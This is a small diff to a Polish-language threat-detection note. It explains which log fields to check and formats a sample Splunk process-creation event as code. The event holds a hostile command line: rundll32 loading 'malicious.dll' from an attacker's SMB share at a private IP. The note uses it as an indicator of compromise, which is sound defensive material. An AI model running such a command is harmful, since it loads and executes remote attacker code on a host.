@@ -51,10 +51,11 @@ Na co patrzeć w strumieniu logów / JSONie:
 *   Wiersz polecenia (CommandLine): Kluczowy wskaźnik (IOC) – zawiera adres IP serwera atakującego oraz odwołanie do protokołu SMB (```\\192.168.0.107\share\...```).
   
 Przykładowy JSON z logu Splunka:
-{
+
+```{
   "EventCode": "4688",
   "ComputerName": "DESKTOP-UR3OJVV",
   "NewProcessName": "C:\\Windows\\System32\\rundll32.exe",
   "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
   "CommandLine": "rundll32.exe \\\\192.168.0.107\\share\\malicious.dll,EntryPoint"
-}
+}```
